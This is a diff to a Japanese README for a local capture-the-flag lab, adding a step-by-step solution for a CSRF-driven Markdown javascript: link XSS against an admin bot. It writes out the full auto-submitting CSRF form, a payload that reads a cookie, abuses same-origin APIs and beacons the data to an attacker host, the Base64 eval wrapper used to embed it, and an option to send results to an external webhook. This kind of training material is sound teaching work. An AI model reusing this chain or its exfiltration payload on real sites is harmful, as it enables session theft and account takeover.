@@ -38,45 +38,145 @@ http://localhost:4000/lab?webhook=<URLエンコードしたWebhook URL>
 flag=FLAG{local_markdown_xss_cookie_lab}
 ```
 
-## 手動解法
+## 詳細解法
 
-ブラウザだけで解く場合は、次の手順で攻撃チェーンを手で追えます。
+`http://localhost:4000/lab` は答え合わせ用の完成済み攻撃ページです。自分で考える場合は、次の順でチェーンを組み立てます。
 
-1. `docker compose up --build` で起動する
-2. `http://localhost:3000/report` を開く
-3. `url` に `http://localhost:4000/lab` を入力して送信する
-4. bot のレスポンスに `"foundLink":true` と `"clicked":true` が出るまで待つ
-5. `http://localhost:4000/loot` を開く
-6. `flag=FLAG{local_markdown_xss_cookie_lab}` が表示されれば成功
+### 1. 攻撃対象の状態保存を確認する
 
-`/lab` は、admin bot のブラウザで読み込まれる CSRF ページです。ページロード時に次の内容を `app` へ自動 POST します。
+`http://localhost:3000/help/search` を開くと、`query` と `greeting` を保存するフォームがあります。`greeting` は同じ疑似セッションの `/help/search` に、次の HTML の中で表示されます。
 
-```text
-POST http://app:3000/help/search
-query=test
-greeting=[open details](javascript:<payload>)
+```html
+<div class="assistant-message">
+  <!-- Markdown rendered greeting -->
+</div>
 ```
 
-`greeting` は `/help/search` で Markdown として表示されます。脆弱版では Markdown リンク URL のスキーム検証が不足しているため、`javascript:` がそのままリンクになります。admin bot は `.assistant-message a` の最初のリンクを通常クリックするので、リンク内の JavaScript が admin セッションの `app` オリジンで実行されます。
+通常ユーザーとして、まず次のような Markdown を `greeting` に入れて保存します。
 
-payload が行うことは次の 4 つだけです。
+```markdown
+[open](javascript:alert(1))
+```
+
+保存後のページでリンクが表示され、クリックすると `alert(1)` が実行されます。この時点で分かることは、HTML タグ直書きではなく Markdown リンクの URL として `javascript:` が通っている、という点です。
+
+### 2. admin bot のクリック条件を読む
+
+bot は `/report` から渡された allowlist 済み URL を開いた後、最終的に `app` の `/help/search` に到達すると、次のセレクタの最初のリンクをクリックします。
+
+```css
+.assistant-message a
+```
+
+つまり、admin bot のセッション内に `greeting=[open](javascript:...)` を保存できれば、bot のクリックで XSS が発火します。
+
+### 3. CSRF で admin 側の greeting を書き換える
+
+脆弱版では `/help/search` の POST に CSRF トークン検証がありません。そのため、attacker 側のページから admin bot に自動 POST させられます。
+
+bot は Docker 内部で動くため、CSRF フォームの送信先は `http://app:3000/help/search` です。フォームの形は次の通りです。
+
+```html
+<form method="post" action="http://app:3000/help/search">
+  <input type="hidden" name="query" value="test">
+  <input type="hidden" name="greeting" value="[open details](javascript:<payload>)">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+このページを admin bot に開かせるため、プレイヤーは `/report` に `http://localhost:4000/lab` を報告します。`/report` は `localhost:4000` を Docker 内部の attacker サービスへ変換して bot に渡します。
+
+### 4. XSS payload を組み立てる
+
+payload では、この CTF 用に意図的に読める `flag` Cookie だけを抽出します。`admin_session` は HttpOnly なので読みません。localStorage、sessionStorage、環境変数、ローカルファイル、OS 情報も読みません。
+
+読みやすく書くと、payload の中身は次の処理です。
 
 ```js
-const flagCookie = document.cookie
-  .split("; ")
-  .find((part) => part.startsWith("flag=")) || "";
-const flag = flagCookie.startsWith("flag=") ? flagCookie.slice("flag=".length) : "";
-const me = await fetch("/api/me", { credentials: "same-origin" }).then((r) => r.json());
-await fetch("/api/conversations/latest/subscribers", {
-  method: "POST",
-  credentials: "same-origin",
-  headers: { "content-type": "application/json" },
-  body: JSON.stringify({ email: "attacker@example.test" })
-});
-navigator.sendBeacon("http://attacker:4000/collect", JSON.stringify({ cookie: flagCookie, flag, me }));
+void (async () => {
+  const flagCookie = document.cookie
+    .split("; ")
+    .find((part) => part.startsWith("flag=")) || "";
+  const flag = flagCookie.startsWith("flag=") ? flagCookie.slice("flag=".length) : "";
+
+  const me = await fetch("/api/me", {
+    credentials: "same-origin"
+  }).then((response) => response.json());
+
+  await fetch("/api/conversations/latest/subscribers", {
+    method: "POST",
+    credentials: "same-origin",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ email: "attacker@example.test" })
+  });
+
+  const body = JSON.stringify({
+    cookie: flagCookie,
+    flag,
+    me
+  });
+
+  if (!navigator.sendBeacon("http://attacker:4000/collect", body)) {
+    await fetch("http://attacker:4000/collect", {
+      method: "POST",
+      mode: "no-cors",
+      body
+    });
+  }
+})();
 ```
 
-実際の `/lab` では、Markdown の括弧や引用符で壊れにくくするため、この JavaScript を Base64 にして `javascript:eval(atob("..."))` 形式で埋め込んでいます。送信先を外部 Webhook にしたい場合は、報告 URL を次の形にします。
+成功すると `/collect` に次の JSON 相当が届きます。
+
+```json
+{
+  "cookie": "flag=FLAG{local_markdown_xss_cookie_lab}",
+  "flag": "FLAG{local_markdown_xss_cookie_lab}",
+  "me": {
+    "role": "admin",
+    "email": "admin@example.test"
+  }
+}
+```
+
+### 5. Markdown リンク用に payload を包む
+
+JavaScript をそのまま Markdown URL に入れると、括弧や空白で Markdown パーサに壊されやすくなります。そのため、実装済みの `/lab` は payload を Base64 にして、次の形にしています。
+
+```markdown
+[open details](javascript:eval(atob("<base64 payload>")))
+```
+
+このリンクが `/help/search` で `<a href="javascript:eval(atob(...))">open details</a>` として表示され、admin bot のクリックで実行されます。
+
+### 6. 報告して結果を見る
+
+完成した CSRF ページを attacker 側で配信できたら、`/report` にその URL を報告します。このラボでは完成済みの CSRF ページが `/lab` にあります。
+
+```text
+http://localhost:4000/lab
+```
+
+bot のレスポンスに次が出れば、リンク発見とクリックまでは成功しています。
+
+```json
+{
+  "foundLink": true,
+  "clicked": true
+}
+```
+
+最後に `http://localhost:4000/loot` を開き、次が表示されれば解けています。
+
+```text
+flag=FLAG{local_markdown_xss_cookie_lab}
+```
+
+同一オリジン API 操作も確認する場合は、`http://localhost:3000/api/conversations/latest` を開きます。XSS 成立後は `attacker@example.test` が `subscribers` に追加されています。
+
+外部 Webhook に送る場合は、Webhook URL を URL エンコードして次の形式で報告します。
 
 ```text
 http://localhost:4000/lab?webhook=<URLエンコードしたWebhook URL>
